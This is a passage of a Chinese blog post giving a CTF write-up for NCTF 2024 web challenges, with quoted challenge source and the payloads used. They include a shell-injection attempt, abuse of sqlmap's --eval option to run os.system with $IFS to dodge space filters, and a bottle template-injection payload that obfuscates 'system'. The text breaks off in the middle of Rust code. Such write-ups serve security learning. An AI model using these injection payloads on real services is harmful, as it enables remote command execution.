@@ -1,0 +1,404 @@
+<!doctype html><html lang=en-zh dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="本次长城杯共解出2道题，总计197分，其中两道WEB安全，有思路但是没解出的2道题。"><title>2024-nctf 个人WP</title>
+<link rel=canonical href=https://hadagaga.github.io/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="2024-nctf 个人WP"><meta property='og:description' content="本次长城杯共解出2道题，总计197分，其中两道WEB安全，有思路但是没解出的2道题。"><meta property='og:url' content='https://hadagaga.github.io/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/'><meta property='og:site_name' content='hadagaga blog'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:tag' content='WP'><meta property='article:published_time' content='2025-03-23T00:00:00+00:00'><meta property='article:modified_time' content='2025-03-23T00:00:00+00:00'><meta property='og:image' content='https://hadagaga.github.io/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/cover.png'><meta name=twitter:title content="2024-nctf 个人WP"><meta name=twitter:description content="本次长城杯共解出2道题，总计197分，其中两道WEB安全，有思路但是没解出的2道题。"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://hadagaga.github.io/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/cover.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu6187617985535410037.png width=300 height=286 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>hadagaga blog</a></h1><h2 class=site-description>不要让时代的悲哀成为你的悲哀。</h2></div></header><ol class=menu-social><li><a href=https://github.com/hadagaga target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#sqlmap-master>sqlmap-master</a></li><li><a href=#ez_dash>ez_dash</a></li><li><a href=#internal_api>internal_api</a><ol><li><ol><li><a href=#后续>后续：</a></li></ol></li></ol></li><li><a href=#x1guessgame>x1guessgame</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/><img src=/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/cover_hu1264380317361736175.png srcset="/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/cover_hu1264380317361736175.png 800w, /p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/cover_hu15654029757687584223.png 1600w" width=800 height=368 loading=lazy alt="Featured image of post 2024-nctf 个人WP"></a></div><div class=article-details><header class=article-category><a href=/categories/cate3/ style=background-color:#2a9d8f;color:#fff>CTF比赛记录</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/>2024-nctf 个人WP</a></h2><h3 class=article-subtitle>本次长城杯共解出2道题，总计197分，其中两道WEB安全，有思路但是没解出的2道题。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Mar 23, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 5 分钟</time></div></footer></div></header><section class=article-content><h2 id=sqlmap-master>sqlmap-master</h2><p><img src=/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323221544863-1742745223472-1-1742745242081-17.png width=1160 height=843 srcset="/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323221544863-1742745223472-1-1742745242081-17_hu9558488240210818340.png 480w, /p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323221544863-1742745223472-1-1742745242081-17_hu872808469729745093.png 1024w" loading=lazy alt=image-20250323221544863 class=gallery-image data-flex-grow=137 data-flex-basis=330px></p><p>​ 访问环境后发现这是一个sqlmap的web服务，传入127.0.0.1后可见执行了sqlmap命令，尝试输入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>127.0.0.1 <span class=o>&amp;&amp;</span> whoami <span class=o>&amp;&amp;</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 发现未能注入命令，分析源码。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>process</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=n>command</span><span class=o>.</span><span class=n>split</span><span class=p>(),</span>
+</span></span><span class=line><span class=cl>        <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>STDOUT</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=n>shell</span><span class=o>=</span><span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 发现执行命令的这个方法，把传入的命令分割了，且<code>shell=False</code>，所以这里的<code>&</code>不会被当作bash的特殊字符，而会被当作传参传入，所以注入失败了。这里我们就得转变方向了，尝试寻找有没有可能利用sqlmap本身的参数。</p><p><img src=/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222129996-1742745223473-3-1742745242081-19.png width=797 height=83 srcset="/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222129996-1742745223473-3-1742745242081-19_hu17872490747136606880.png 480w, /p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222129996-1742745223473-3-1742745242081-19_hu1601812863080770260.png 1024w" loading=lazy alt=image-20250323222129996 class=gallery-image data-flex-grow=960 data-flex-basis=2304px></p><p>​ 我们发现这里有一个eval参数可以执行任意的python代码，所以我们可以构造如下参数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>127.0.0.1 --eval eval<span class=o>(</span><span class=s2>&#34;__import__(&#39;os&#39;).system(&#39;echo</span><span class=nv>$IFS$FLAG</span><span class=s2>&gt;&gt;test&#39;)&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=c1>#因为&#39; &#39;会被作为分隔符，所以需要绕一下，其中，$IFS 替代 &#39; &#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 我们就可以输出$FLAG变量到同目录的test文件中。</p><p><img src=/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222657311-1742745223473-4-1742745242081-20.png width=1644 height=735 srcset="/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222657311-1742745223473-4-1742745242081-20_hu15428052466885694564.png 480w, /p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222657311-1742745223473-4-1742745242081-20_hu38169590453542880.png 1024w" loading=lazy alt=image-20250323222657311 class=gallery-image data-flex-grow=223 data-flex-basis=536px></p><p>​ 好的我们现在已经写好了文件，那么我们怎么读取文件？</p><p><img src=/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222528181-1742745223473-2-1742745242081-18.png width=670 height=34 srcset="/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222528181-1742745223473-2-1742745242081-18_hu3100303437325224469.png 480w, /p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222528181-1742745223473-2-1742745242081-18_hu5154265228115663880.png 1024w" loading=lazy alt=image-20250323222528181 class=gallery-image data-flex-grow=1970 data-flex-basis=4729px></p><p>​ 我们可以利用这个参数，他会在文件内容不合法时，将文件的第一行输出出来。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>127.0.0.1 -c <span class=nb>test</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222631576-1742745223473-5-1742745242081-21.png width=1538 height=559 srcset="/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222631576-1742745223473-5-1742745242081-21_hu2221882103016588995.png 480w, /p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222631576-1742745223473-5-1742745242081-21_hu12464982128789821357.png 1024w" loading=lazy alt=image-20250323222631576 class=gallery-image data-flex-grow=275 data-flex-basis=660px></p><p>​ 我们就得到flag了。</p><h2 id=ez_dash>ez_dash</h2><p><img src=/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222816552-1742745223473-6-1742745242081-22.png width=737 height=347 srcset="/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222816552-1742745223473-6-1742745242081-22_hu593377960115486778.png 480w, /p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323222816552-1742745223473-6-1742745242081-22_hu17368420830433966491.png 1024w" loading=lazy alt=image-20250323222816552 class=gallery-image data-flex-grow=212 data-flex-basis=509px></p><p>​ 访问环境后发现提示404，我们审计一下源码，发现有两个路由。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>setval</span><span class=p>(</span><span class=n>name</span><span class=p>:</span><span class=nb>str</span><span class=p>,</span> <span class=n>path</span><span class=p>:</span><span class=nb>str</span><span class=p>,</span> <span class=n>value</span><span class=p>:</span><span class=nb>str</span><span class=p>)</span><span class=o>-&gt;</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>bool</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>name</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;__&#34;</span><span class=p>)</span><span class=o>&gt;=</span><span class=mi>0</span><span class=p>:</span> <span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>word</span> <span class=ow>in</span> <span class=n>__forbidden_name__</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>name</span><span class=o>==</span><span class=n>word</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>word</span> <span class=ow>in</span> <span class=n>__forbidden_path__</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>path</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>word</span><span class=p>)</span><span class=o>&gt;=</span><span class=mi>0</span><span class=p>:</span> <span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=n>obj</span><span class=o>=</span><span class=nb>globals</span><span class=p>()[</span><span class=n>name</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>pydash</span><span class=o>.</span><span class=n>set_</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=n>path</span><span class=p>,</span><span class=n>value</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@bottle.post</span><span class=p>(</span><span class=s1>&#39;/setValue&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>set_value</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>name</span> <span class=o>=</span> <span class=n>bottle</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>query</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>path</span><span class=o>=</span><span class=n>bottle</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>json</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;path&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>path</span><span class=p>,</span><span class=nb>str</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;no&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>name</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>6</span> <span class=ow>or</span> <span class=nb>len</span><span class=p>(</span><span class=n>path</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>32</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;no&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>value</span><span class=o>=</span><span class=n>bottle</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>json</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;value&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;yes&#34;</span> <span class=k>if</span> <span class=n>setval</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=n>value</span><span class=p>)</span> <span class=k>else</span> <span class=s2>&#34;no&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@bottle.get</span><span class=p>(</span><span class=s1>&#39;/render&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>render_template</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>path</span><span class=o>=</span><span class=n>bottle</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>query</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;path&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>path</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;{&#34;</span><span class=p>)</span><span class=o>&gt;=</span><span class=mi>0</span> <span class=ow>or</span> <span class=n>path</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;}&#34;</span><span class=p>)</span><span class=o>&gt;=</span><span class=mi>0</span> <span class=ow>or</span> <span class=n>path</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>)</span><span class=o>&gt;=</span><span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Hacker&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>bottle</span><span class=o>.</span><span class=n>template</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 这里我们发现，<code>render</code>路由是存在一个模板注入漏洞的，<code>setValue</code>路由可以设置环境变量。对于设置环境变量我没有找到合适的利用方式，因为根据我们分析，如果是通过变量访问的话，需要通过<code>%</code>去访问变量，一开始我没想到这个，后来想到了之后直接就通过<code>getattr</code>，去获取<code>system</code>方法，然后传入参数就可以执行系统命令了。我们构造如下payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>%</span><span class=nb>getattr</span><span class=p>(</span><span class=nb>__import__</span><span class=p>(</span><span class=s1>&#39;os&#39;</span><span class=p>),</span> <span class=s1>&#39;s&#39;</span><span class=o>+</span><span class=s1>&#39;ystem&#39;</span><span class=p>)(</span><span class=s1>&#39;echo $FLAG&gt;&gt;test&#39;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 这样我们就可以利用模板注入漏洞执行系统命令了，记得URL编码一下。</p><p><img src=/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323224108185-1742745223473-7-1742745242081-23.png width=670 height=213 srcset="/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323224108185-1742745223473-7-1742745242081-23_hu3894905729057533658.png 480w, /p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323224108185-1742745223473-7-1742745242081-23_hu10179699961465269532.png 1024w" loading=lazy alt=image-20250323224108185 class=gallery-image data-flex-grow=314 data-flex-basis=754px></p><p>​ 然后我们把同目录test文件作为模板文件来读取就能读出flag了。这似乎是个非预期解，预期的利用方式我也想不到。</p><h2 id=internal_api>internal_api</h2><p>​ <img src=/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323224415321-1742745223473-8-1742745242081-24.png width=1400 height=571 srcset="/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323224415321-1742745223473-8-1742745242081-24_hu8973872570927325749.png 480w, /p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/image-20250323224415321-1742745223473-8-1742745242081-24_hu5846314220757319538.png 1024w" loading=lazy alt=image-20250323224415321 class=gallery-image data-flex-grow=245 data-flex-basis=588px></p><p>​ 进来之后发现是这么搜索页面，旁边有个report URL的功能，我们直接开始分析源码，先分析路由：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-rust data-lang=rust><span class=line><span class=cl><span class=kd>let</span><span class=w> </span><span class=n>app</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Router</span>::<span class=n>new</span><span class=p>()</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>.</span><span class=n>route</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span><span class=w> </span><span class=n>get</span><span class=p>(</span><span class=n>route</span>::<span class=n>index</span><span class=p>))</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>.</span><span class=n>route</span><span class=p>(</span><span class=s>&#34;/report&#34;</span><span class=p>,</span><span class=w> </span><span class=n>post</span><span class=p>(</span><span class=n>route</span>::<span class=n>report</span><span class=p>))</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>.</span><span class=n>route</span><span class=p>(</span><span class=s>&#34;/search&#34;</span><span class=p>,</span><span class=w> </span><span class=n>get</span><span class=p>(</span><span class=n>route</span>::<span class=n>public_search</span><span class=p>))</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>.</span><span class=n>route</span><span class=p>(</span><span class=s>&#34;/internal/search&#34;</span><span class=p>,</span><span class=w> </span><span class=n>get</span><span class=p>(</span><span class=n>route</span>::<span class=n>private_search</span><span class=p>))</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>.</span><span class=n>with_state</span><span class=p>(</span><span class=n>Arc</span>::<span class=n>new</span><span class=p>(</span><span class=n>pool</span><span class=p>));</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 可见这里有4个路由，其中<code>/search</code>就是普通用户的搜索路由，<code>internal/search</code>这个路由我们分析源码可以发现这个路由只能由本地的<code>selenium</code>服务去访问，<code>/report</code>则是向本地的<code>selenium</code>服务添加请求的，我们先分析公共的搜索方法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-rust data-lang=rust><span class=line><span class=cl><span class=k>pub</span><span class=w> </span><span class=k>async</span><span class=w> </span><span class=k>fn</span> <span class=nf>public_search</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Query</span><span class=p>(</span><span class=n>search</span><span class=p>)</span>: <span class=nc>Query</span><span class=o>&lt;</span><span class=n>Search</span><span class=o>&gt;</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>State</span><span class=p>(</span><span class=n>pool</span><span class=p>)</span>: <span class=nc>State</span><span class=o>&lt;</span><span class=n>Arc</span><span class=o>&lt;</span><span class=n>DbPool</span><span class=o>&gt;&gt;</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>)</span><span class=w> </span>-&gt; <span class=nb>Result</span><span class=o>&lt;</span><span class=n>Json</span><span class=o>&lt;</span><span class=nb>Vec</span><span class=o>&lt;</span><span class=nb>String</span><span class=o>&gt;&gt;</span><span class=p>,</span><span class=w> </span><span class=n>AppError</span><span class=o>&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>pool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=n>clone</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>conn</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=n>get</span><span class=p>()</span><span class=o>?</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>comments</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>db</span>::<span class=n>search</span><span class=p>(</span><span class=n>conn</span><span class=p>,</span><span class=w> </span><span class=n>search</span><span class=p>.</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=n>comments</span><span class=p>.</span><span class=n>len</span><span class=p>()</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=p>{</span><span class=w>
